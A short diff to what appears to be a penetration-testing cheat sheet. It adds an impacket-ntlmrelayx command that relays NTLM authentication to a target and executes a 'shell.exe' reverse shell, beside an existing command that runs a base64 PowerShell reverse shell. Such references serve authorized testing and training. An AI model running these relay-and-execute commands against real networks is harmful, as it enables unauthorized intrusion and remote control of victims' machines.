@@ -1704,6 +1704,10 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 
 # Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
+
+# Execute a reverse shell using impacket-ntlmrelayx.
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -e shell.exe
+
 ```
 ##### Attacking SQL
 ```
